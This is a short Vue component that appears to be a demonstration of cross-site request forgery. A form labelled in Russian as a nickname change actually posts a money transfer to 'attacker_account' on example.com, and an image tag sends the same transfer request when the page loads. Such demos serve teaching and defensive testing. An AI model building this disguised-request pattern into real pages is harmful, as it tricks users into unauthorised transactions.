<script setup lang="ts">
import { ref } from 'vue';

const form = ref<null | HTMLFormElement>(null);
const nickname = ref('new_nickname');
const submitHandler = (): void => {
  if (!form.value) return;
  form.value.submit();
};
</script>

<template>
  <div>Изменить никнейм:</div>
  <form ref="form" action="https://example.com/transfer.php?amount=100&recipient=attacker_account" method="POST">
    <input name="nickname" v-model="nickname" />
    <button @click="submitHandler">submit</button>
  </form>
  <img src="https://example.com/transfer.php?amount=100&recipient=attacker_account" />
</template>

<style scoped lang="scss"></style>
